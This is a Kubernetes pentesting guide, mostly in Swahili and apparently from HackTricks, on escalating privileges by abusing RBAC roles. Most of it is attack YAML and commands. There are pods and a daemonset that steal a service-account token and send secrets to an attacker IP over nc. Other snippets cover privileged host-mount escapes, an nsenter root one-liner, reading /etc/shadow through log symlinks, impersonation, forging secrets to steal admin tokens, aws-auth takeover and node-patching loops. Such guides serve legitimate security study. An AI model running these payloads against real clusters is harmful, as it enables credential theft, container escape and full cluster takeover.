# Abusing Roles/ClusterRoles in Kubernetes

{{#include ../../../banners/hacktricks-training.md}}

Hapa unaweza kupata baadhi ya mipangilio ya Roles na ClusterRoles ambayo inaweza kuwa hatari.\
Kumbuka kwamba unaweza kupata rasilimali zote zinazoungwa mkono kwa kutumia `kubectl api-resources`

## **Privilege Escalation**

Inarejelea sanaa ya kupata **ufikiaji wa principal tofauti** ndani ya klasta **ikiwa na mamlaka tofauti** (ndani ya klasta ya kubernetes au kwa mawingu ya nje) kuliko zile ulizo nazo tayari, katika Kubernetes kuna kimsingi **mbinu 4 kuu za kupandisha mamlaka**:

- Kuwa na uwezo wa **kujifanya** mtumiaji/katika makundi/SAs wengine wenye mamlaka bora ndani ya klasta ya kubernetes au kwa mawingu ya nje
- Kuwa na uwezo wa **kuunda/kurekebisha/kutekeleza pods** ambapo unaweza **kupata au kuunganisha SAs** wenye mamlaka bora ndani ya klasta ya kubernetes au kwa mawingu ya nje
- Kuwa na uwezo wa **kusoma siri** kwani token za SAs zimehifadhiwa kama siri
- Kuwa na uwezo wa **kutoroka hadi kwenye node** kutoka kwenye kontena, ambapo unaweza kuiba siri zote za kontena zinazofanya kazi kwenye node, akidi za node, na ruhusa za node ndani ya wingu inayoendesha (ikiwa ipo)
- Mbinu ya tano ambayo inastahili kutajwa ni uwezo wa **kukimbia port-forward** katika pod, kwani unaweza kuwa na uwezo wa kufikia rasilimali za kuvutia ndani ya pod hiyo.

### Access Any Resource or Verb (Wildcard)

**wildcard (\*) inatoa ruhusa juu ya rasilimali yoyote na kitenzi chochote**. Inatumika na wasimamizi. Ndani ya ClusterRole hii inamaanisha kwamba mshambuliaji anaweza kutumia anynamespace katika klasta
```yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
name: api-resource-verbs-all
rules:
rules:
- apiGroups: ["*"]
resources: ["*"]
verbs: ["*"]
```
### Upata Rasilimali Yoyote kwa Kitenzi Maalum

Katika RBAC, ruhusa fulani zina hatari kubwa:

1. **`create`:** Inatoa uwezo wa kuunda rasilimali yoyote ya klasta, ikihatarisha kupanda kwa mamlaka.
2. **`list`:** Inaruhusu kuorodhesha rasilimali zote, ikihatarisha kuvuja kwa data nyeti.
3. **`get`:** Inaruhusu kufikia siri kutoka kwa akaunti za huduma, ikileta tishio la usalama.
```yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
name: api-resource-verbs-all
rules:
rules:
- apiGroups: ["*"]
resources: ["*"]
verbs: ["create", "list", "get"]
```
### Pod Create - Steal Token

Mshambuliaji mwenye ruhusa za kuunda pod, anaweza kuunganisha Akaunti ya Huduma yenye mamlaka ndani ya pod na kuiba token ili kujifanya kuwa Akaunti ya Huduma. Kwa ufanisi anapandisha mamlaka kwake.

Mfano wa pod ambayo itakuwa na uwezo wa kuiba token ya akaunti ya huduma ya `bootstrap-signer` na kuisafirisha kwa mshambuliaji:
```yaml
apiVersion: v1
kind: Pod
metadata:
name: alpine
namespace: kube-system
spec:
containers:
- name: alpine
image: alpine
command: ["/bin/sh"]
args:
[
"-c",
'apk update && apk add curl --no-cache; cat /run/secrets/kubernetes.io/serviceaccount/token | { read TOKEN; curl -k -v -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" https://192.168.154.228:8443/api/v1/namespaces/kube-system/secrets; } | nc -nv 192.168.154.228 6666; sleep 100000',
]
serviceAccountName: bootstrap-signer
automountServiceAccountToken: true
hostNetwork: true
```
### Pod Create & Escape

Ifuatayo inaonyesha haki zote ambazo kontena inaweza kuwa nazo:

- **Upatikanaji wa haki** (kuondoa ulinzi na kuweka uwezo)
- **Zima namespaces hostIPC na hostPid** ambazo zinaweza kusaidia kuongeza haki
- **Zima hostNetwork** namespace, ikitoa ufikiaji wa kuiba haki za wingu za nodi na ufikiaji bora wa mitandao
- **Mount hosts / ndani ya kontena**
```yaml:super_privs.yaml
apiVersion: v1
kind: Pod
metadata:
name: ubuntu
labels:
app: ubuntu
spec:
# Uncomment and specify a specific node you want to debug
# nodeName: <insert-node-name-here>
containers:
- image: ubuntu
command:
- "sleep"
- "3600" # adjust this as needed -- use only as long as you need
imagePullPolicy: IfNotPresent
name: ubuntu
securityContext:
allowPrivilegeEscalation: true
privileged: true
#capabilities:
#  add: ["NET_ADMIN", "SYS_ADMIN"] # add the capabilities you need https://man7.org/linux/man-pages/man7/capabilities.7.html
runAsUser: 0 # run as root (or any other user)
volumeMounts:
- mountPath: /host
name: host-volume
restartPolicy: Never # we want to be intentional about running this pod
hostIPC: true # Use the host's ipc namespace https://www.man7.org/linux/man-pages/man7/ipc_namespaces.7.html
hostNetwork: true # Use the host's network namespace https://www.man7.org/linux/man-pages/man7/network_namespaces.7.html
hostPID: true # Use the host's pid namespace https://man7.org/linux/man-pages/man7/pid_namespaces.7.htmlpe_
volumes:
- name: host-volume
hostPath:
path: /
```
Unda pod na:
```bash
kubectl --token $token create -f mount_root.yaml
```
Moja-laini kutoka [hiki tweet](https://twitter.com/mauilion/status/1129468485480751104) na nyongeza kadhaa:
```bash
kubectl run r00t --restart=Never -ti --rm --image lol --overrides '{"spec":{"hostPID": true, "containers":[{"name":"1","image":"alpine","command":["nsenter","--mount=/proc/1/ns/mnt","--","/bin/bash"],"stdin": true,"tty":true,"imagePullPolicy":"IfNotPresent","securityContext":{"privileged":true}}]}}'
```
Sasa kwamba unaweza kukimbia kwenye node angalia mbinu za baada ya unyakuzi katika:

#### Stealth

Huenda unataka kuwa **stealthier**, katika kurasa zinazofuata unaweza kuona kile ambacho unaweza kufikia ikiwa utaunda pod kwa kuwezesha baadhi ya ruhusa zilizotajwa katika kiolezo kilichopita:

- **Privileged + hostPID**
- **Privileged tu**
- **hostPath**
- **hostPID**
- **hostNetwork**
- **hostIPC**

_Unaweza kupata mfano wa jinsi ya kuunda/kutumia vibaya usanidi wa pods wenye ruhusa zilizotangulia katika_ [_https://github.com/BishopFox/badPods_](https://github.com/BishopFox/badPods)

### Pod Create - Hamia kwenye wingu

Ikiwa unaweza **kuunda** **pod** (na hiari **akaunti ya huduma**) huenda ukawa na uwezo wa **kupata ruhusa katika mazingira ya wingu** kwa **kuteua majukumu ya wingu kwa pod au akaunti ya huduma** na kisha kuifikia.\
Zaidi ya hayo, ikiwa unaweza kuunda **pod yenye namespace ya mtandao wa mwenyeji** unaweza **kuiba IAM** jukumu la **node** instance.

Kwa maelezo zaidi angalia:

{{#ref}}
pod-escape-privileges.md
{{#endref}}

### **Create/Patch Deployment, Daemonsets, Statefulsets, Replicationcontrollers, Replicasets, Jobs na Cronjobs**

Inawezekana kutumia vibaya ruhusa hizi ili **kuunda pod mpya** na kuanzisha ruhusa kama katika mfano wa awali.

YAML ifuatayo **inaunda daemonset na inatoa token ya SA** ndani ya pod:
```yaml
apiVersion: apps/v1
kind: DaemonSet
metadata:
name: alpine
namespace: kube-system
spec:
selector:
matchLabels:
name: alpine
template:
metadata:
labels:
name: alpine
spec:
serviceAccountName: bootstrap-signer
automountServiceAccountToken: true
hostNetwork: true
containers:
- name: alpine
image: alpine
command: ["/bin/sh"]
args:
[
"-c",
'apk update && apk add curl --no-cache; cat /run/secrets/kubernetes.io/serviceaccount/token | { read TOKEN; curl -k -v -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" https://192.168.154.228:8443/api/v1/namespaces/kube-system/secrets; } | nc -nv 192.168.154.228 6666; sleep 100000',
]
volumeMounts:
- mountPath: /root
name: mount-node-root
volumes:
- name: mount-node-root
hostPath:
path: /
```
### **Pods Exec**

**`pods/exec`** ni rasilimali katika kubernetes inayotumika kwa **kukimbia amri katika shell ndani ya pod**. Hii inaruhusu **kukimbia amri ndani ya kontena au kupata shell ndani**.

Hivyo, inawezekana **kuingia ndani ya pod na kuiba token ya SA**, au kuingia pod yenye mamlaka, kutoroka hadi kwenye node, na kuiba token zote za pods katika node na (ku)itumia node:
```bash
kubectl exec -it <POD_NAME> -n <NAMESPACE> -- sh
```
### port-forward

Ruhusa hii inaruhusu **kupeleka bandari moja ya ndani kwa bandari moja katika pod iliyoainishwa**. Hii inakusudia kuwezesha kufuatilia programu zinazotembea ndani ya pod kwa urahisi, lakini mshambuliaji anaweza kuitumia vibaya kupata ufikiaji wa programu za kuvutia (kama DBs) au programu zenye udhaifu (webs?) ndani ya pod:
```
kubectl port-forward pod/mypod 5000:5000
```
### Hosts Writable /var/log/ Escape

Kama [**ilivyoonyeshwa katika utafiti huu**](https://jackleadford.github.io/containers/2020/03/06/pvpost.html), ikiwa unaweza kufikia au kuunda pod yenye **hosts `/var/log/` directory mounted** juu yake, unaweza **kutoroka kutoka kwenye kontena**.\
Hii ni kwa sababu wakati **Kube-API inajaribu kupata logi** za kontena (kwa kutumia `kubectl logs <pod>`), inafanya **ombwe la `0.log`** la pod kwa kutumia `/logs/` endpoint ya huduma ya **Kubelet**.\
Huduma ya Kubelet inatoa `/logs/` endpoint ambayo kimsingi ni **kuonyesha mfumo wa faili wa `/var/log` wa kontena**.

Kwa hivyo, mshambuliaji mwenye **ufikiaji wa kuandika katika folda /var/log/** ya kontena anaweza kutumia tabia hii kwa njia 2:

- Kubadilisha faili `0.log` la kontena lake (ambalo kawaida liko katika `/var/logs/pods/namespace_pod_uid/container/0.log`) kuwa **symlink inayoelekeza kwenye `/etc/shadow`** kwa mfano. Kisha, utaweza kuhamasisha faili la kivuli cha mwenyeji kwa kufanya:
```bash
kubectl logs escaper
failed to get parse function: unsupported log format: "root::::::::\n"
kubectl logs escaper --tail=2
failed to get parse function: unsupported log format: "systemd-resolve:*:::::::\n"
# Keep incrementing tail to exfiltrate the whole file
```
- Ikiwa mshambuliaji anadhibiti kiongozi yeyote mwenye **idhini za kusoma `nodes/log`**, anaweza tu kuunda **symlink** katika `/host-mounted/var/log/sym` hadi `/` na wakati **anapofikia `https://<gateway>:10250/logs/sym/` atataja mfumo wa faili wa mizizi wa mwenyeji** (kubadilisha symlink kunaweza kutoa ufikiaji wa faili).
```bash
curl -k -H 'Authorization: Bearer eyJhbGciOiJSUzI1NiIsImtpZCI6Im[...]' 'https://172.17.0.1:10250/logs/sym/'
<a href="bin">bin</a>
<a href="data/">data/</a>
<a href="dev/">dev/</a>
<a href="etc/">etc/</a>
<a href="home/">home/</a>
<a href="init">init</a>
<a href="lib">lib</a>
[...]
```
**Maabara na exploit ya otomatiki inaweza kupatikana katika** [**https://blog.aquasec.com/kubernetes-security-pod-escape-log-mounts**](https://blog.aquasec.com/kubernetes-security-pod-escape-log-mounts)

#### Kupita ulinzi wa readOnly <a href="#bypassing-hostpath-readonly-protection" id="bypassing-hostpath-readonly-protection"></a>

Ikiwa una bahati na uwezo wa juu wa `CAP_SYS_ADMIN upo, unaweza tu kuunganisha tena folda hiyo kama rw:
```bash
mount -o rw,remount /hostlogs/
```
#### Kupita ulinzi wa hostPath readOnly <a href="#bypassing-hostpath-readonly-protection" id="bypassing-hostpath-readonly-protection"></a>

Kama ilivyoelezwa katika [**utafiti huu**](https://jackleadford.github.io/containers/2020/03/06/pvpost.html) inawezekana kupita ulinzi:
```yaml
allowedHostPaths:
- pathPrefix: "/foo"
readOnly: true
```
Ambayo ilikusudia kuzuia kutoroka kama zile za awali kwa, badala ya kutumia mtego wa hostPath, kutumia PersistentVolume na PersistentVolumeClaim ili kuunganisha folda ya mwenyeji ndani ya kontena kwa ufikiaji wa kuandika:
```yaml
apiVersion: v1
kind: PersistentVolume
metadata:
name: task-pv-volume-vol
labels:
type: local
spec:
storageClassName: manual
capacity:
storage: 10Gi
accessModes:
- ReadWriteOnce
hostPath:
path: "/var/log"
---
apiVersion: v1
kind: PersistentVolumeClaim
metadata:
name: task-pv-claim-vol
spec:
storageClassName: manual
accessModes:
- ReadWriteOnce
resources:
requests:
storage: 3Gi
---
apiVersion: v1
kind: Pod
metadata:
name: task-pv-pod
spec:
volumes:
- name: task-pv-storage-vol
persistentVolumeClaim:
claimName: task-pv-claim-vol
containers:
- name: task-pv-container
image: ubuntu:latest
command: ["sh", "-c", "sleep 1h"]
volumeMounts:
- mountPath: "/hostlogs"
name: task-pv-storage-vol
```
### **Kujifanya kuwa akaunti zenye mamlaka**

Kwa kutumia [**kujifanya kuwa mtumiaji**](https://kubernetes.io/docs/reference/access-authn-authz/authentication/#user-impersonation) mamlaka, mshambuliaji anaweza kujifanya kuwa akaunti yenye mamlaka.

Tumia tu parameter `--as=<username>` katika amri ya `kubectl` kujifanya kuwa mtumiaji, au `--as-group=<group>` kujifanya kuwa kundi:
```bash
kubectl get pods --as=system:serviceaccount:kube-system:default
kubectl get secrets --as=null --as-group=system:masters
```
Au tumia API ya REST:
```bash
curl -k -v -XGET -H "Authorization: Bearer <JWT TOKEN (of the impersonator)>" \
-H "Impersonate-Group: system:masters"\
-H "Impersonate-User: null" \
-H "Accept: application/json" \
https://<master_ip>:<port>/api/v1/namespaces/kube-system/secrets/
```
### Kuorodhesha Siri

Ruhusa ya **kuorodhesha siri inaweza kumruhusu mshambuliaji kusoma siri** kwa kufikia kiunganishi cha API ya REST:
```bash
curl -v -H "Authorization: Bearer <jwt_token>" https://<master_ip>:<port>/api/v1/namespaces/kube-system/secrets/
```
### Kuunda na Kusoma Siri

Kuna aina maalum ya siri ya Kubernetes ya aina **kubernetes.io/service-account-token** ambayo inahifadhi token za akaunti za huduma. Ikiwa una ruhusa za kuunda na kusoma siri, na pia unajua jina la akaunti ya huduma, unaweza kuunda siri kama ifuatavyo na kisha kuiba token ya akaunti ya huduma ya mwathirika kutoka kwake:
```yaml
apiVersion: v1
kind: Secret
metadata:
name: stolen-admin-sa-token
namespace: default
annotations:
kubernetes.io/service-account.name: cluster-admin-sa
type: kubernetes.io/service-account-token
```
Mfano wa unyakuzi:
```bash
$ SECRETS_MANAGER_TOKEN=$(kubectl create token secrets-manager-sa)

$ kubectl auth can-i --list --token=$SECRETS_MANAGER_TOKEN
Warning: the list may be incomplete: webhook authorizer does not support user rule resolution
Resources                                       Non-Resource URLs                      Resource Names   Verbs
selfsubjectreviews.authentication.k8s.io        []                                     []               [create]
selfsubjectaccessreviews.authorization.k8s.io   []                                     []               [create]
selfsubjectrulesreviews.authorization.k8s.io    []                                     []               [create]
secrets                                         []                                     []               [get create]
[/.well-known/openid-configuration/]   []               [get]
<SNIP>
[/version]                             []               [get]

$ kubectl create token cluster-admin-sa --token=$SECRETS_MANAGER_TOKEN
error: failed to create token: serviceaccounts "cluster-admin-sa" is forbidden: User "system:serviceaccount:default:secrets-manager-sa" cannot create resource "serviceaccounts/token" in API group "" in the namespace "default"

$ kubectl get pods --token=$SECRETS_MANAGER_TOKEN --as=system:serviceaccount:default:secrets-manager-sa
Error from server (Forbidden): serviceaccounts "secrets-manager-sa" is forbidden: User "system:serviceaccount:default:secrets-manager-sa" cannot impersonate resource "serviceaccounts" in API group "" in the namespace "default"

$ kubectl apply -f ./secret-that-steals-another-sa-token.yaml --token=$SECRETS_MANAGER_TOKEN
secret/stolen-admin-sa-token created

$ kubectl get secret stolen-admin-sa-token --token=$SECRETS_MANAGER_TOKEN -o json
{
"apiVersion": "v1",
"data": {
"ca.crt": "LS0tLS1CRUdJTiBDRVJUSUZJQ0FU<SNIP>UlRJRklDQVRFLS0tLS0K",
"namespace": "ZGVmYXVsdA==",
"token": "ZXlKaGJHY2lPaUpTVXpJMU5pSXNJbXRwWk<SNIP>jYkowNWlCYjViMEJUSE1NcUNIY0h4QTg2aXc="
},
"kind": "Secret",
"metadata": {
"annotations": {
"kubectl.kubernetes.io/last-applied-configuration": "{\"apiVersion\":\"v1\",\"kind\":\"Secret\",\"metadata\":{\"annotations\":{\"kubernetes.io/service-account.name\":\"cluster-admin-sa\"},\"name\":\"stolen-admin-sa-token\",\"namespace\":\"default\"},\"type\":\"kubernetes.io/service-account-token\"}\n",
"kubernetes.io/service-account.name": "cluster-admin-sa",
"kubernetes.io/service-account.uid": "faf97f14-1102-4cb9-9ee0-857a6695973f"
},
"creationTimestamp": "2025-01-11T13:02:27Z",
"name": "stolen-admin-sa-token",
"namespace": "default",
"resourceVersion": "1019116",
"uid": "680d119f-89d0-4fc6-8eef-1396600d7556"
},
"type": "kubernetes.io/service-account-token"
}
```
Kumbuka kwamba ikiwa unaruhusiwa kuunda na kusoma siri katika eneo fulani, akaunti ya huduma ya mwathirika pia lazima iwe katika eneo hilo hilo.

### Kusoma siri â€“ kulazimisha vitambulisho vya tokeni

Wakati mshambuliaji mwenye tokeni yenye ruhusa za kusoma anahitaji jina sahihi la siri ili kuitumia, tofauti na ruhusa pana ya _**kuorodhesha siri**_, bado kuna udhaifu. Akaunti za huduma za default katika mfumo zinaweza kuorodheshwa, kila moja ikihusishwa na siri. Siri hizi zina muundo wa jina: kiambatisho kisichobadilika kinachofuatiwa na tokeni ya alphanumeric ya herufi tano za nasibu (bila herufi fulani) kulingana na [source code](https://github.com/kubernetes/kubernetes/blob/8418cccaf6a7307479f1dfeafb0d2823c1c37802/staging/src/k8s.io/apimachinery/pkg/util/rand/rand.go#L83).

Tokeni inazalishwa kutoka seti ndogo ya herufi 27 (`bcdfghjklmnpqrstvwxz2456789`), badala ya anuwai kamili ya alphanumeric. Kizuizi hiki kinapunguza jumla ya mchanganyiko unaowezekana kuwa 14,348,907 (27^5). Kwa hivyo, mshambuliaji anaweza kutekeleza shambulio la kulazimisha kwa urahisi ili kubaini tokeni hiyo ndani ya masaa machache, ambayo yanaweza kusababisha kupandishwa vyeo kwa kufikia akaunti za huduma nyeti.

### Maombi ya Kusaini Cheti

Ikiwa una vitenzi **`create`** katika rasilimali `certificatesigningrequests` (au angalau katika `certificatesigningrequests/nodeClient`). Unaweza **kuunda** CeSR mpya ya **node mpya.**

Kulingana na [nyaraka inawezekana kuidhinisha maombi haya kiotomatiki](https://kubernetes.io/docs/reference/command-line-tools-reference/kubelet-tls-bootstrapping/), hivyo katika hali hiyo **huhitaji ruhusa za ziada**. Ikiwa sivyo, unahitaji kuwa na uwezo wa kuidhinisha ombi, ambayo inamaanisha sasisha katika `certificatesigningrequests/approval` na `approve` katika `signers` na resourceName `<signerNameDomain>/<signerNamePath>` au `<signerNameDomain>/*`

Mfano wa **role** yenye ruhusa zote zinazohitajika ni:
```yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
name: csr-approver
rules:
- apiGroups:
- certificates.k8s.io
resources:
- certificatesigningrequests
verbs:
- get
- list
- watch
- create
- apiGroups:
- certificates.k8s.io
resources:
- certificatesigningrequests/approval
verbs:
- update
- apiGroups:
- certificates.k8s.io
resources:
- signers
resourceNames:
- example.com/my-signer-name # example.com/* can be used to authorize for all signers in the 'example.com' domain
verbs:
- approve
```
Hivyo, na CSR mpya ya node iliyothibitishwa, unaweza **kudhulumu** ruhusa maalum za nodes ili **kuiba siri** na **kuinua mamlaka**.

Katika [**post hii**](https://www.4armed.com/blog/hacking-kubelet-on-gke/) na [**hii moja**](https://rhinosecuritylabs.com/cloud-security/kubelet-tls-bootstrap-privilege-escalation/) usanidi wa GKE K8s TLS Bootstrap umewekwa na **kusainiwa kiotomatiki** na unatumika vibaya kuzalisha akreditif za Node mpya ya K8s na kisha kudhulumu hizo ili kuinua mamlaka kwa kuiba siri.\
Ikiwa **una mamlaka zilizotajwa unaweza kufanya jambo hilo hilo**. Kumbuka kwamba mfano wa kwanza unazidi kosa linalozuia node mpya kufikia siri ndani ya kontena kwa sababu **node inaweza kufikia tu siri za kontena zilizowekwa juu yake.**

Njia ya kupita hii ni tu **kuunda akreditif za node kwa jina la node ambapo kontena lenye siri za kuvutia limewekwa** (lakini angalia tu jinsi ya kufanya hivyo katika post ya kwanza):
```bash
"/O=system:nodes/CN=system:node:gke-cluster19-default-pool-6c73b1-8cj1"
```
### AWS EKS aws-auth configmaps

Wajibu wanaoweza kubadilisha **`configmaps`** katika eneo la kube-system kwenye EKS (lazima wawe ndani ya AWS) vikundi wanaweza kupata haki za usimamizi wa klasta kwa kubadilisha configmap ya **aws-auth**.\
Vitenzi vinavyohitajika ni **`update`** na **`patch`**, au **`create`** ikiwa configmap haijaundwa:
```bash
# Check if config map exists
get configmap aws-auth -n kube-system -o yaml

## Yaml example
apiVersion: v1
kind: ConfigMap
metadata:
name: aws-auth
namespace: kube-system
data:
mapRoles: |
- rolearn: arn:aws:iam::123456789098:role/SomeRoleTestName
username: system:node{{EC2PrivateDNSName}}
groups:
- system:masters

# Create donfig map is doesn't exist
## Using kubectl and the previous yaml
kubectl apply -f /tmp/aws-auth.yaml
## Using eksctl
eksctl create iamidentitymapping --cluster Testing --region us-east-1 --arn arn:aws:iam::123456789098:role/SomeRoleTestName --group "system:masters" --no-duplicate-arns

# Modify it
kubectl edit -n kube-system configmap/aws-auth
## You can modify it to even give access to users from other accounts
data:
mapRoles: |
- rolearn: arn:aws:iam::123456789098:role/SomeRoleTestName
username: system:node{{EC2PrivateDNSName}}
groups:
- system:masters
mapUsers: |
- userarn: arn:aws:iam::098765432123:user/SomeUserTestName
username: admin
groups:
- system:masters
```
> [!WARNING]
> Unaweza kutumia **`aws-auth`** kwa **kuendelea** kutoa ufikiaji kwa watumiaji kutoka **akaunti nyingine**.
>
> Hata hivyo, `aws --profile other_account eks update-kubeconfig --name <cluster-name>` **haifanyi kazi kutoka akaunti tofauti**. Lakini kwa kweli `aws --profile other_account eks get-token --cluster-name arn:aws:eks:us-east-1:123456789098:cluster/Testing` inafanya kazi ikiwa utaweka ARN ya klasta badala ya jina tu.\
> Ili kufanya `kubectl` ifanye kazi, hakikisha tu **unapanga** **kubeconfig ya waathirika** na katika arg za aws exec ongeza `--profile other_account_role` ili kubectl itumie profaili ya akaunti nyingine kupata token na kuwasiliana na AWS.

### Kuongeza Haki katika GKE

Kuna **njia 2 za kutoa ruhusa za K8s kwa wakuu wa GCP**. Katika hali yoyote mkuu pia anahitaji ruhusa **`container.clusters.get`** ili kuwa na uwezo wa kukusanya akidi za kuingia kwenye klasta, au utahitaji **kuunda faili yako ya kubectl config** (fuata kiungo kinachofuata).

> [!WARNING]
> Wakati wa kuzungumza na kiunganishi cha K8s api, **token ya uthibitisho ya GCP itatumwa**. Kisha, GCP, kupitia kiunganishi cha K8s api, kwanza **itaangalia kama mkuu** (kwa barua pepe) **ana ufikiaji wowote ndani ya klasta**, kisha itaangalia kama ana **ufikiaji wowote kupitia GCP IAM**.\
> Ikiwa **yoyote** kati ya hizo ni **kweli**, atajibiwa. Ikiwa **siyo** makosa **yanayopendekeza kutoa** **ruhusa kupitia GCP IAM** yatatolewa.

Kisha, njia ya kwanza ni kutumia **GCP IAM**, ruhusa za K8s zina **ruhusa sawa za GCP IAM**, na ikiwa mkuu ana hiyo, ataweza kuitumia.

{{#ref}}
../../gcp-security/gcp-privilege-escalation/gcp-container-privesc.md
{{#endref}}

Njia ya pili ni **kutoa ruhusa za K8s ndani ya klasta** kwa kutambua mtumiaji kwa **barua pepe** yake (akaunti za huduma za GCP zimejumuishwa).

### Kuunda token za serviceaccounts

Wakuu wanaoweza **kuunda TokenRequests** (`serviceaccounts/token`) Wakati wa kuzungumza na kiunganishi cha K8s api SAs (habari kutoka [**hapa**](https://github.com/PaloAltoNetworks/rbac-police/blob/main/lib/token_request.rego)).

### ephemeralcontainers

Wakuu wanaoweza **`update`** au **`patch`** **`pods/ephemeralcontainers`** wanaweza kupata **utendaji wa msimbo kwenye pods nyingine**, na kwa uwezekano **kuvunja** kwenye node yao kwa kuongeza container ya muda mfupi yenye securityContext yenye mamlaka.

### ValidatingWebhookConfigurations au MutatingWebhookConfigurations

Wakuu wenye mojawapo ya vitenzi `create`, `update` au `patch` juu ya `validatingwebhookconfigurations` au `mutatingwebhookconfigurations` wanaweza kuwa na uwezo wa **kuunda moja ya webhookconfigurations hizo** ili waweze **kuongeza mamlaka**.

Kwa [`mfano wa mutatingwebhookconfigurations angalia sehemu hii ya chapisho hili`](#malicious-admission-controller).

### Pandisha

Kama unavyoweza kusoma katika sehemu inayofuata: [**Kuzuia Kuongeza Mamlaka ya Kijadi**](#built-in-privileged-escalation-prevention), mkuu cannot update wala kuunda roles au clusterroles bila kuwa na ruhusa hizo mpya. Isipokuwa ikiwa ana **kitenzi `escalate`** juu ya **`roles`** au **`clusterroles`.**\
Kisha anaweza kuupdate/kuunda roles mpya, clusterroles zenye ruhusa bora kuliko zile alizonazo.

### Nodes proxy

Wakuu wenye ufikiaji wa **`nodes/proxy`** subresource wanaweza **kutekeleza msimbo kwenye pods** kupitia Kubelet API (kulingana na [**hii**](https://github.com/PaloAltoNetworks/rbac-police/blob/main/lib/nodes_proxy.rego)). Taarifa zaidi kuhusu uthibitishaji wa Kubelet katika ukurasa huu:

{{#ref}}
../pentesting-kubernetes-services/kubelet-authentication-and-authorization.md
{{#endref}}

Una mfano wa jinsi ya kupata [**RCE kwa kuzungumza na Kubelet API hapa**](../pentesting-kubernetes-services/index.html#kubelet-rce).

### Futa pods + nodes zisizoweza kupanga

Wakuu wanaoweza **kufuta pods** (`delete` verb juu ya `pods` resource), au **kuhamasisha pods** (`create` verb juu ya `pods/eviction` resource), au **kubadilisha hali ya pod** (ufikiaji wa `pods/status`) na wanaweza **kufanya nodes nyingine zisizoweza kupanga** (ufikiaji wa `nodes/status`) au **kufuta nodes** (`delete` verb juu ya `nodes` resource) na ana udhibiti juu ya pod, wanaweza **kuiba pods kutoka nodes nyingine** ili ziwe **zinatekelezwa** katika **node iliyoathirika** na mshambuliaji anaweza **kuiba token** kutoka kwa pods hizo.
```bash
patch_node_capacity(){
curl -s -X PATCH 127.0.0.1:8001/api/v1/nodes/$1/status -H "Content-Type: json-patch+json" -d '[{"op": "replace", "path":"/status/allocatable/pods", "value": "0"}]'
}

while true; do patch_node_capacity <id_other_node>; done &
#Launch previous line with all the nodes you need to attack

kubectl delete pods -n kube-system <privileged_pod_name>
```
### Hali za huduma (CVE-2020-8554)

Wajibu wanaoweza **kubadilisha** **`services/status`** wanaweza kuweka uwanja wa `status.loadBalancer.ingress.ip` ili kutumia **CVE-2020-8554 isiyorekebishwa** na kuanzisha **MiTM attacks dhidi ya kluster**. Mitihani mingi ya CVE-2020-8554 inazuia tu huduma za ExternalIP (kulingana na [**hii**](https://github.com/PaloAltoNetworks/rbac-police/blob/main/lib/modify_service_status_cve_2020_8554.rego)).

### Hali za Nodes na Pods

Wajibu wenye ruhusa za **`update`** au **`patch`** juu ya `nodes/status` au `pods/status`, wanaweza kubadilisha lebo ili kuathiri vikwazo vya kupanga vinavyotekelezwa.

## Kinga ya Kukuza Privilege iliyojengwa ndani

Kubernetes ina [mekanismu iliyojengwa ndani](https://kubernetes.io/docs/reference/access-authn-authz/rbac/#privilege-escalation-prevention-and-bootstrapping) ya kuzuia kukuza privilege.

Mfumo huu unahakikisha kwamba **watumiaji hawawezi kuongeza privileges zao kwa kubadilisha roles au role bindings**. Utekelezaji wa sheria hii unafanyika katika ngazi ya API, ukitoa kinga hata wakati RBAC authorizer haifanyi kazi.

Sheria inasema kwamba **mtumiaji anaweza tu kuunda au kubadilisha role ikiwa ana ruhusa zote zinazohusiana na role hiyo**. Aidha, upeo wa ruhusa za mtumiaji zilizopo lazima ulingane na ule wa role wanayojaribu kuunda au kubadilisha: ama kwa kiwango cha kluster kwa ClusterRoles au kufungwa kwenye namespace sawa (au kwa kiwango cha kluster) kwa Roles.

> [!WARNING]
> Kuna ubaguzi wa sheria ya awali. Ikiwa wajibu ana **verb `escalate`** juu ya **`roles`** au **`clusterroles`** anaweza kuongeza privileges za roles na clusterroles hata bila kuwa na ruhusa hizo mwenyewe.

### **Pata & Patch RoleBindings/ClusterRoleBindings**

> [!CAUTION]
> **Kwa kweli, mbinu hii ilifanya kazi hapo awali, lakini kulingana na majaribio yangu haifanyi kazi tena kwa sababu ile ile iliyoelezwa katika sehemu ya awali. Huwezi kuunda/kubadilisha rolebinding ili kujipa wewe au SA tofauti baadhi ya privileges ikiwa tayari huna.**

Ruhusa ya kuunda Rolebindings inamruhusu mtumiaji **kuunganisha roles na akaunti ya huduma**. Ruhusa hii inaweza kupelekea kukuza privilege kwa sababu inaruhusu mtumiaji kuunganisha ruhusa za admin kwa akaunti ya huduma iliyovunjwa.

## Mashambulizi Mengine

### Programu ya proxy ya Sidecar

Kwa kawaida hakuna usimbuaji katika mawasiliano kati ya pods. Uthibitishaji wa pamoja, wa pande mbili, kutoka pod hadi pod.

#### Unda programu ya proxy ya sidecar <a href="#create-a-sidecar-proxy-app" id="create-a-sidecar-proxy-app"></a>

Unda yako .yaml
```bash
kubectl run app --image=bash --command -oyaml --dry-run=client > <appName.yaml> -- sh -c 'ping google.com'
```
Hariri faili yako ya .yaml na ongeza mistari isiyo na maoni:
```yaml
#apiVersion: v1
#kind: Pod
#metadata:
#  name: security-context-demo
#spec:
#  securityContext:
#    runAsUser: 1000
#    runAsGroup: 3000
#    fsGroup: 2000
#  volumes:
#  - name: sec-ctx-vol
#    emptyDir: {}
#  containers:
#  - name: sec-ctx-demo
#    image: busybox
command:
[
"sh",
"-c",
"apt update && apt install iptables -y && iptables -L && sleep 1h",
]
securityContext:
capabilities:
add: ["NET_ADMIN"]
#   volumeMounts:
#   - name: sec-ctx-vol
#     mountPath: /data/demo
#   securityContext:
#     allowPrivilegeEscalation: true
```
Tazama kumbukumbu za proxy:
```bash
kubectl logs app -C proxy
```
More info at: [https://kubernetes.io/docs/tasks/configure-pod-container/security-context/](https://kubernetes.io/docs/tasks/configure-pod-container/security-context/)

### Malicious Admission Controller

An admission controller **intercepts requests to the Kubernetes API server** before the persistence of the object, but **after the request is authenticated** **and authorized**.

If an attacker somehow manages to **inject a Mutationg Admission Controller**, he will be able to **modify already authenticated requests**. Being able to potentially privesc, and more usually persist in the cluster.

